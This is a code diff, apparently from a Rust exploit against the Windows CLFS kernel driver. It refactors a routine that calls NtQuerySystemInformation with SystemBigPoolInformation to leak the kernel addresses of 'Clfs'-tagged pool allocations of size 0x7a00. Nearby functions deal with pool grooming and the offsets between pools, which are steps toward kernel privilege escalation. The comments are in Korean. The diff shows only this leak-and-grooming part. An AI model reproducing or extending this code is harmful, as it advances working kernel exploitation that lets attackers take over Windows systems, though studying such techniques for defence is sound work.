@@ -446,40 +446,25 @@ fn create_initial_log_file() -> io::Result<LogPaths> {
 
 fn get_big_pool_info(clfs_pools: &mut ClfsPools){
     let mut buffer_size: u32 = 0;
-    let mut bigpool_buffer:Vec<u32> = Vec::new();
+    let bigpool_buffer = nt_helper::nt_system_big_pool_infomation_helper();
 
-    bigpool_buffer.resize(10, 0);
+    if let Ok(bigpool_buffer) = bigpool_buffer {
+        //SystemBigPoolInformation이 성공한 상태
     
-    loop{
-        let status: NTSTATUS = unsafe {
-                NtQuerySystemInformation(
-                SystemInformationClass::SystemBigPoolInformation,
-                bigpool_buffer.as_mut_ptr().cast::<c_void>(),
-                buffer_size,
-                &mut buffer_size,
-            )
+        let info = unsafe {
+            &*(bigpool_buffer.as_ptr() as *const SystemBigPoolInformation)
         };
-        if status == STATUS_INFO_LENGTH_MISMATCH {
-            bigpool_buffer.resize((buffer_size + 1) as usize, 0);
-            continue;
-        }
-        break;
-    }
-    //SystemBigPoolInformation이 성공한 상태
-    //bigpool_buffer을 순회하면서 원하는 문자열을 찾고, 기존에 등록되지 않았을 경우 push
-    let info = unsafe {
-        &*(bigpool_buffer.as_ptr() as *const SystemBigPoolInformation)
-    };
 
-    for i in (0..info.count as usize).rev() {
-        let entry = unsafe {
-            &*info.entries.as_ptr().add(i)
-        };
-        if entry.tag() == b"Clfs" && entry.size_in_bytes == 0x7a00 {
-            let res = clfs_pools.push_if_new(entry.virtual_address());
+        //bigpool_buffer을 순회하면서 원하는 문자열을 찾고, 기존에 등록되지 않았을 경우 push
+        for i in (0..info.count as usize).rev() {
+            let entry = unsafe {
+                &*info.entries.as_ptr().add(i)
+            };
+            if entry.tag() == b"Clfs" && entry.size_in_bytes == 0x7a00 {
+                let res = clfs_pools.push_if_new(entry.virtual_address());
+            }
         }
     }
-    
 }
 
 fn get_offset_between_pool(logpath: &LogPaths) -> Option<GroomingRes>{
@@ -550,7 +535,6 @@ fn get_offset_between_pool(logpath: &LogPaths) -> Option<GroomingRes>{
 
     Some(grooming_res)
 }
-
 
 
 fn crc32(data: &[u8]) -> u32 {
